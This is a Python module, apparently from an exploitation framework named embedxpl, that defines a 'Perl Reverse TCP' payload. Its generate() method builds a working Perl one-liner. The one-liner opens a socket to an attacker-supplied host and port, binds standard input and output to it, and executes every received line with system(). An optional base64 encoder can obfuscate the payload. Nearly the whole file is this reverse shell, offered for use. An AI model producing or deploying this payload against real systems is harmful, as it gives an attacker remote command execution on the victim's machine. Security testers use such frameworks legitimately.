from embedxpl.core.exploit.option import OptEncoder
from embedxpl.core.exploit.payloads import (
    GenericPayload,
    Architectures,
    ReverseTCPPayloadMixin,
)
from embedxpl.modules.encoders.perl.base64 import Encoder


class Payload(ReverseTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "Perl Reverse TCP",
        "description": "Creates interactive tcp reverse shell by using perl.",
        "authors": (
            "Marcin Bury",
            "André Henrique (@mrhenrike)",
        ),
    }

    architecture = Architectures.PERL
    encoder = OptEncoder(Encoder(), "Encoder")

    def generate(self):
        return (
            "use IO;foreach my $key(keys %ENV){" +
            "if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"" +
            self.lhost +
            ":" +
            str(self.lport) +
            "\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};"
        )
